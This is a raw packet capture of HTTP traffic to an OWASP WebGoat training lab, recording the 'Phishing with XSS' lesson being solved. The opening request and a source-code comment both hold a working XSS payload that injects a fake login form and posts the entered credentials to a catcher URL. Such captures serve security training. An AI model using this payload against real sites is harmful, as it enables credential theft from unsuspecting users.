@@ -1,0 +1,2357 @@
+interface: eth0 (192.168.0.0/255.255.255.0)
+match: HTTP
+
+T 192.168.33.1:58712 -> 192.168.0.100:80 [AP]
+POST /WebGoat/attack?Screen=1382523204&menu=900 HTTP/1.1.
+Host: webgoat.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: */*.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8.
+X-Requested-With: XMLHttpRequest.
+Content-Length: 913.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+Connection: keep-alive.
+.
+Username=%3C%2Fform%3E%3Cscript%3Efunction+hack()%7B+XSSImage%3Dnew+Image%3B+XSSImage.src%3D%22http%3A%2F%2Fwebgoat.cyexc-target%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26user%3D%22%2B+document.phish.user.value+%2B+%22%26password%3D%22+%2B+document.phish.pass.value+%2B+%22%22%3B+alert(%22Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+%3D+%22+%2B+document.phish.user.value+%2B+%22Password+%3D+%22+%2B+document.phish.pass.value)%3B%7D+%3C%2Fscript%3E%3Cform+name%3D%22phish%22%3E%3Cbr%3E%3Cbr%3E%3CHR%3E%3CH3%3EThis+feature+requires+account+login%3A%3C%2FH3+%3E%3Cbr%3E%3Cbr%3EEnter+Username%3A%3Cbr%3E%3Cinput+type%3D%22text%22+name%3D%22user%22%3E%3Cbr%3EEnter+Password%3A%3Cbr%3E%3Cinput+type%3D%22password%22+name+%3D+%22pass%22%3E%3Cbr%3E%3Cinput+type%3D%22submit%22+name%3D%22login%22+value%3D%22login%22+onclick%3D%22hack()%22%3E%3C%2Fform%3E%3Cbr%3E%3Cbr%3E%3CHR%3E&SUBMIT=Search
+
+T 192.168.0.100:41064 -> 192.168.0.10:8080 [A]
+POST /WebGoat/attack?Screen=1382523204&menu=900 HTTP/1.1.
+X-Forwarded-Host: webgoat.cyexc-target.
+X-Forwarded-Server: webgoat.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: webgoat.cyexc-target.
+Connection: close.
+Content-Length: 913.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: */*.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+.
+Username=%3C%2Fform%3E%3Cscript%3Efunction+hack()%7B+XSSImage%3Dnew+Image%3B+XSSImage.src%3D%22http%3A%2F%2Fwebgoat.cyexc-target%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26user%3D%22%2B+document.phish.user.value+%2B+%22%26password%3D%22+%2B+document.phish.pass.value+%2B+%22%22%3B+alert(%22Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+%3D+%22+%2B+document.phish.user.value+%2B+%22Password+%3D+%22+%2B+document.phish.pass.value)%3B%7D+%3C%2Fscript%3E%3Cform+name%3D%22phish%22%3E%3Cbr%3E%3Cbr%3E%3CHR%3E%3CH3%3EThis+feature+requires+account+login%3A%3C%2FH3+%3E%3Cbr%3E%3Cbr%3EEnter+Username%3A%3Cbr%3E%3Cinput+type%3D%22text%22+name%3D%22user%22%3E%3Cbr%3EEnter+Password%3A%3Cbr%3E%3Cinput+type%3D%22password%22+name+%3D+%22pass%22%3E%3Cbr%
+
+T 192.168.0.10:8080 -> 192.168.0.100:41064 [A]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Content-Type: text/html;charset=ISO-8859-1.
+Content-Length: 2693.
+Date: Thu, 18 Jan 2018 13:02:00 GMT.
+Connection: close.
+.
+
+
+
+
+
+<!-- HTML fragment correpsonding to the lesson content -->
+
+
+<div id="lessonContent">
+    
+    This lesson is an example of how a website might support a phishing attack if there is a known XSS attack on the page<BR><BR>Below is an example of a standard search feature.<br>Using XSS and HTML insertion, your goal is to: <UL> <LI>Insert html to that requests credentials <LI>Add javascript to actually collect the credentials <LI>Post the credentials to http://localhost:8080/WebGoat/catcher?PROPERTY=yes...</UL>  to pass this lesson, the credentials must be posted to the catcher servlet.<BR></div>
+<div id="message" class="info"></div>
+
+
+<div id="lessonContent"><form accept-charset='UNKNOWN' method='POST' name='form' action='#attack/1382523204/900' enctype=''><h1>WebGoat Search </h1><table align='center' cellspacing='0' border='0' cellpadding='2'><tr><td colspan='2'>&nbsp;</td></tr><tr><th colspan='2' align='center'>This facility will search the WebGoat source.</th></tr><tr><td colspan='2'>&nbsp;</td></tr><tr><td align='right'><b>Search: </b></td><td align='left'><input name='Username' type='TEXT' value='</form><script>function hack(){ XSSImage=new Image; XSSImage.src="http://webgoat.cyexc-target/WebGoat/catcher?PROPERTY=yes&user="+ document.phish.user.value + "
+
+T 192.168.0.100:80 -> 192.168.33.1:58712 [A]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Thu, 18 Jan 2018 13:02:00 GMT.
+Content-Type: text/html;charset=ISO-8859-1.
+Content-Length: 2693.
+Connection: keep-alive.
+.
+
+
+
+
+
+<!-- HTML fragment correpsonding to the lesson content -->
+
+
+<div id="lessonContent">
+    
+    This lesson is an example of how a website might support a phishing attack if there is a known XSS attack on the page<BR><BR>Below is an example of a standard search feature.<br>Using XSS and HTML insertion, your goal is to: <UL> <LI>Insert html to that requests credentials <LI>Add javascript to actually collect the credentials <LI>Post the credentials to http://localhost:8080/WebGoat/catcher?PROPERTY=yes...</UL>  to pass this lesson, the credentials must be posted to the catcher servlet.<BR></div>
+<div id="message" class="info"></div>
+
+
+<div id="lessonContent"><form accept-charset='UNKNOWN' method='POST' name='form' action='#attack/1382523204/900' enctype=''><h1>WebGoat Search </h1><table align='center' cellspacing='0' border='0' cellpadding='2'><tr><td colspan='2'>&nbsp;</td></tr><tr><th colspan='2' align='center'>This facility will search the WebGoat source.</th></tr><tr><td colspan='2'>&nbsp;</td></tr><tr><td align='right'><b>Search: </b></td><td align='left'><input name='Username' type='TEXT' value='</form><script>function hack(){ XSSImage=new Image; XSSImage.src="http://webgoat.cyexc-target/WebGoat/catcher?PROPERTY=yes&user="+ document.phish.user.value + "
+
+T 192.168.33.1:58712 -> 192.168.0.100:80 [AP]
+GET /WebGoat/service/lessoninfo.mvc HTTP/1.1.
+Host: webgoat.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: application/json, text/javascript, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+Connection: keep-alive.
+.
+
+
+T 192.168.0.100:41065 -> 192.168.0.10:8080 [AP]
+GET /WebGoat/service/lessoninfo.mvc HTTP/1.1.
+X-Forwarded-Host: webgoat.cyexc-target.
+X-Forwarded-Server: webgoat.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: webgoat.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: application/json, text/javascript, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+.
+
+
+T 192.168.33.1:58713 -> 192.168.0.100:80 [AP]
+GET /WebGoat/service/lessonplan.mvc HTTP/1.1.
+Host: webgoat.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: text/html, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+Connection: keep-alive.
+.
+
+
+T 192.168.0.100:41066 -> 192.168.0.10:8080 [AP]
+GET /WebGoat/service/lessonplan.mvc HTTP/1.1.
+X-Forwarded-Host: webgoat.cyexc-target.
+X-Forwarded-Server: webgoat.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: webgoat.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: text/html, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+.
+
+
+T 192.168.33.1:58714 -> 192.168.0.100:80 [AP]
+GET /WebGoat/service/solution.mvc HTTP/1.1.
+Host: webgoat.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: text/html, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+Connection: keep-alive.
+.
+
+
+T 192.168.0.100:41067 -> 192.168.0.10:8080 [AP]
+GET /WebGoat/service/solution.mvc HTTP/1.1.
+X-Forwarded-Host: webgoat.cyexc-target.
+X-Forwarded-Server: webgoat.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: webgoat.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: text/html, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+.
+
+
+T 192.168.33.1:58715 -> 192.168.0.100:80 [AP]
+GET /WebGoat/service/source.mvc HTTP/1.1.
+Host: webgoat.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: text/html, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+Connection: keep-alive.
+.
+
+
+T 192.168.0.100:41068 -> 192.168.0.10:8080 [AP]
+GET /WebGoat/service/source.mvc HTTP/1.1.
+X-Forwarded-Host: webgoat.cyexc-target.
+X-Forwarded-Server: webgoat.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: webgoat.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: text/html, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+.
+
+
+T 192.168.33.1:58716 -> 192.168.0.100:80 [AP]
+GET /WebGoat/service/hint.mvc HTTP/1.1.
+Host: webgoat.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: application/json, text/javascript, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+Connection: keep-alive.
+.
+
+
+T 192.168.0.100:41069 -> 192.168.0.10:8080 [AP]
+GET /WebGoat/service/hint.mvc HTTP/1.1.
+X-Forwarded-Host: webgoat.cyexc-target.
+X-Forwarded-Server: webgoat.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: webgoat.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: application/json, text/javascript, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+.
+
+
+T 192.168.33.1:58717 -> 192.168.0.100:80 [AP]
+GET /WebGoat/service/cookie.mvc HTTP/1.1.
+Host: webgoat.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: application/json, text/javascript, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+Connection: keep-alive.
+.
+
+
+T 192.168.0.100:41070 -> 192.168.0.10:8080 [AP]
+GET /WebGoat/service/cookie.mvc HTTP/1.1.
+X-Forwarded-Host: webgoat.cyexc-target.
+X-Forwarded-Server: webgoat.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: webgoat.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: application/json, text/javascript, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+.
+
+
+T 192.168.0.10:8080 -> 192.168.0.100:41070 [AP]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+Content-Type: application/json.
+Transfer-Encoding: chunked.
+Date: Thu, 18 Jan 2018 13:02:00 GMT.
+Connection: close.
+.
+a3.
+[{"name":"JSESSIONID","value":"1DE275FF3CB6077682FF5DE9D98632FE","comment":null,"domain":null,"maxAge":-1,"path":null,"secure":false,"version":0,"httpOnly":false}].
+
+
+T 192.168.0.100:80 -> 192.168.33.1:58717 [AP]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Thu, 18 Jan 2018 13:02:00 GMT.
+Content-Type: application/json.
+Transfer-Encoding: chunked.
+Connection: keep-alive.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+.
+a3.
+[{"name":"JSESSIONID","value":"1DE275FF3CB6077682FF5DE9D98632FE","comment":null,"domain":null,"maxAge":-1,"path":null,"secure":false,"version":0,"httpOnly":false}].
+
+
+T 192.168.0.10:8080 -> 192.168.0.100:41066 [AP]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+Content-Type: application/html.
+Content-Length: 739.
+Date: Thu, 18 Jan 2018 13:02:00 GMT.
+Connection: close.
+.
+<div align="Center"> 
+<p><b>Lesson Plan Title:</b> Phishing with XSS </p>
+ </div>
+ <p><b>Concept / Topic To Teach:</b> </p>
+<!-- Start Instructions -->
+It is always a good practice to validate all input on the server side.
+ XSS can occur when unvalidated user input is used in an HTTP response. 
+ With the help of XSS you can do a Phishing Attack and add content to a page
+ which looks official. It is very hard for a victim to determinate
+ that the content is malicious.
+<!-- Stop Instructions -->
+<p><b>General Goal(s):</b> </p>
+The user should be able to add a form asking for username
+and password. On submit the input should be sent
+to http://localhost/WebGoat/catcher?PROPERTY=yes &user=catchedUserName&password=catchedPasswordName
+
+
+
+T 192.168.0.100:80 -> 192.168.33.1:58713 [AP]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Thu, 18 Jan 2018 13:02:00 GMT.
+Content-Type: application/html.
+Content-Length: 739.
+Connection: keep-alive.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+.
+<div align="Center"> 
+<p><b>Lesson Plan Title:</b> Phishing with XSS </p>
+ </div>
+ <p><b>Concept / Topic To Teach:</b> </p>
+<!-- Start Instructions -->
+It is always a good practice to validate all input on the server side.
+ XSS can occur when unvalidated user input is used in an HTTP response. 
+ With the help of XSS you can do a Phishing Attack and add content to a page
+ which looks official. It is very hard for a victim to determinate
+ that the content is malicious.
+<!-- Stop Instructions -->
+<p><b>General Goal(s):</b> </p>
+The user should be able to add a form asking for username
+and password. On submit the input should be sent
+to http://localhost/WebGoat/catcher?PROPERTY=yes &user=catchedUserName&password=catchedPasswordName
+
+
+
+T 192.168.33.1:58713 -> 192.168.0.100:80 [AP]
+GET /WebGoat/service/lessonmenu.mvc HTTP/1.1.
+Host: webgoat.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: application/json, text/javascript, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+Connection: keep-alive.
+.
+
+
+T 192.168.33.1:58717 -> 192.168.0.100:80 [AP]
+GET /WebGoat/service/lessonprogress.mvc HTTP/1.1.
+Host: webgoat.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: application/json, text/javascript, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+Connection: keep-alive.
+.
+
+
+T 192.168.0.100:41071 -> 192.168.0.10:8080 [AP]
+GET /WebGoat/service/lessonmenu.mvc HTTP/1.1.
+X-Forwarded-Host: webgoat.cyexc-target.
+X-Forwarded-Server: webgoat.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: webgoat.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: application/json, text/javascript, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+.
+
+
+T 192.168.0.100:41072 -> 192.168.0.10:8080 [AP]
+GET /WebGoat/service/lessonprogress.mvc HTTP/1.1.
+X-Forwarded-Host: webgoat.cyexc-target.
+X-Forwarded-Server: webgoat.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: webgoat.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: application/json, text/javascript, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+.
+
+
+T 192.168.0.10:8080 -> 192.168.0.100:41072 [AP]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+Content-Type: application/json.
+Transfer-Encoding: chunked.
+Date: Thu, 18 Jan 2018 13:02:00 GMT.
+Connection: close.
+.
+6a.
+{"lessonCompleted":false,"successMessage":"Congratulations. You have successfully completed this lesson."}.
+
+
+T 192.168.0.100:80 -> 192.168.33.1:58717 [AP]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Thu, 18 Jan 2018 13:02:00 GMT.
+Content-Type: application/json.
+Transfer-Encoding: chunked.
+Connection: keep-alive.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+.
+6a.
+{"lessonCompleted":false,"successMessage":"Congratulations. You have successfully completed this lesson."}.
+
+
+T 192.168.0.10:8080 -> 192.168.0.100:41068 [A]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+Content-Type: application/text.
+Content-Length: 8070.
+Date: Thu, 18 Jan 2018 13:02:00 GMT.
+Connection: close.
+.
+
+package org.owasp.webgoat.plugin;
+
+import java.util.ArrayList;
+import java.util.List;
+import org.apache.ecs.Element;
+import org.apache.ecs.ElementContainer;
+import org.apache.ecs.StringElement;
+import org.apache.ecs.html.B;
+import org.apache.ecs.html.BR;
+import org.apache.ecs.html.Comment;
+import org.apache.ecs.html.H1;
+import org.apache.ecs.html.HR;
+import org.apache.ecs.html.Input;
+import org.apache.ecs.html.TD;
+import org.apache.ecs.html.TH;
+import org.apache.ecs.html.TR;
+import org.apache.ecs.html.Table;
+import org.owasp.webgoat.Catcher;
+import org.owasp.webgoat.lessons.Category;
+import org.owasp.webgoat.lessons.LessonAdapter;
+import org.owasp.webgoat.session.ECSFactory;
+import org.owasp.webgoat.session.WebSession;
+
+
+/***************************************************************************************************
+ * 
+ * 
+ * This file is part of WebGoat, an Open Web Application Security Project utility. For details,
+ * please see http://www.owasp.org/
+ * 
+ * Copyright (c) 2002 - 20014 Bruce Mayhew
+ * 
+ * This program is free software; you can redistribute it and/or modify it under the terms of the
+ * GNU General Public License as published by the Free Software Foundation; either version 2 of the
+ * License, or (at your option) any later version.
+ * 
+ * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
+ * even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
+ * General Public License for more details.
+ * 
+ * You should have received a copy of the GNU General Public License along with this program; if
+ * not, write to the Free Software Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA
+ * 02111-1307, USA.
+ * 
+ * Getting Source ==============
+ * 
+ * Source for this application is maintained at https://github.com/WebGoat/WebGoat, a repository for free software
+ * projects.
+ * 
+ * For details, please see http://webgoat.github.io
+ * 
+ * @author Bruce Mayhew &lt;a href=&quot;http://code.google.com/p/webgoat&quot;&gt;WebGoat&lt;/a&gt;
+ * @created March 13, 2007
+ */
+public class Phishing extends LessonAdapter
+{
+
+    /**
+     * Description of the Field
+     */
+    protected final static String SEARCH = &quot;Username&quot;;
+    private String searchText;
+
+    /**
+     * Description of the Method
+     * 
+     * @param s
+     *            Description of the Parameter
+     * @return Description of the Return Value
+     */
+    private boolean postedCredentials(WebSession s)
+    {
+        String postedToCookieCatcher = getLessonTracker(s).getLessonProperties().getProperty(Catcher.PROPERTY,
+                                                                                                Catcher.EMPTY_STRING);
+
+        // &lt;Code Section Deliberately Omitted&gt;
+
+            ec.addElement(makeSearch(s));
+            if (postedCredentials(s))
+            {
+                makeSuccess(s);
+            }
+        } catch (Exception e)
+        {
+            s.setMessage(getLabelManager().get(&quot;PhishingErrorGenerating&quot;) + this.getClass().getName());
+        }
+
+        return (ec);
+    }
+
+    protected Element makeSearch(WebSession s)
+    {
+        ElementContainer ec = new ElementContainer();
+
+        ec.addElement(new H1().addElement(getLabelManager().get(&quot;PhishingDialogTitle&quot;)));
+        Table t = new Table().setCellSpacing(0).setCellPadding(2).setBorder(0).setAlign(&quot;center&quot;);
+
+        TR tr = new TR();
+        tr.addElement(new TD().addElement(&quot;&amp;nbsp;&quot;).setColSpan(2));
+        t.addElement(tr);
+        if (s.isColor())
+        {
+            t.setBorder(1);
+        }
+
+        tr = new TR();
+        tr.addElement(new TH().addElement(getLabelManager().get(&quot;PhishingDialogText&quot;)).setColSpan(2)
+                .setAlign(&quot;center&quot;));
+        t.addElement(tr);
+
+        tr = new TR();
+        tr.addElement(new TD().addElement(&quot;&amp;nbsp;&quot;).setColSpan(2));
+        t.addElement(tr);
+
+        TR row1 = new TR();
+        row1.addElement(new TD(new B(new StringElement(getLabelManager().get(&quot;PhishingSearch1&quot;)))).setAlign(&quot;right&quot;));
+
+        Input input1 = new Input(Input.TEXT, SEARCH, searchText);
+        row1.addElement(new TD(input1).setAlign(&quot;left&quot;));
+        t.addElement(row1);
+
+        Element b = ECSFactory.makeButton(getLabelManager().get(&quot;PhishingSearch2&quot;));
+        t.addElement(new TR(new TD(b).setColSpan(2)).setAlign(&quot;center&quot;));
+        ec.addElement(t);
+
+        if (!searchText.equals(&quot;&quot;))
+        {
+            ec.addElement(new BR());
+            ec.addElement(new HR());
+            ec.addElement(new BR());
+            ec.addElement(new StringElement(getLabelManager().get(&quot;PhishingResults&quot;) + searchText));
+            ec.addElement(new Comment(getLabelManager().get(&quot;PhishingSearchResults&quot;)));
+            ec.addElement(new BR());
+            ec.addElement(new BR());
+            ec.addElement(new B(new StringElement(getLabelManager().get(&quot;PhishingNoResults&quot;))));
+            ec.addElement(new Comment(getLabelManager().get(&quot;PhishingEndOfSearchResults&quot;)));
+        }
+
+        return (ec);
+    }
+
+    /**
+     * Gets the hints attribute of the CluesScreen object
+     * 
+     * @return The hints value
+     */
+    protected List&lt;String&gt; getHints(WebSession s)
+    {
+        List&lt;String&gt; hints = new ArrayList&lt;String&gt;();
+        hints.add(getLabelManager().get(&quot;PhishingHint1&quot;));
+        hints.add(getLabelManager().get(&quot;PhishingHint2&quot;));
+        hints.add(getLabelManager().get(&quot;PhishingHint3&quot;));
+        hints.add(getLabelManager().get(&quot;PhishingHint4&quot;));
+        hints.add(getLabelManager().get(&quot;PhishingHint5&quot;));
+        hints.add(getLabelManager().get(&quot;PhishingHint6&quot;));
+        hints.add(getLabelManager().get(&quot;PhishingHint7&quot;));
+        /**
+         * password&lt;script&gt;function hack(){ alert(&quot;Had this been a real attack... Your credentials
+         * were just stolen.\nUser Name = &quot; + document.phish.user.value + &quot;\nPassword = &quot; +
+         * document.phish.pass.value); XSSImage=new Image;
+         * XSSImage.src=&quot;http://localhost:8080/WebGoat/catcher?PROPERTY=yes&amp;user=&quot;
+         * +document.phish.user.value + &quot;&amp;password=&quot; + document.phish.pass.value +
+         * &quot;&quot;;}&lt;/script&gt;&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;
+         * &lt;br&gt;
+         * &lt;HR&gt;
+         * &lt;H3&gt;This feature requires account login:&lt;/H2&gt; &lt;br&gt;
+         * &lt;br&gt;
+         * Enter Username:&lt;br&gt;
+         * &lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;
+         * Enter Password:&lt;br&gt;
+         * &lt;input type=&quot;password&quot; name = &quot;pass&quot;&gt;&lt;br&gt;
+         * &lt;input type=&quot;submit&quot; name=&quot;login&quot; 
+
+T 192.168.0.100:80 -> 192.168.33.1:58715 [A]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Thu, 18 Jan 2018 13:02:00 GMT.
+Content-Type: application/text.
+Content-Length: 8070.
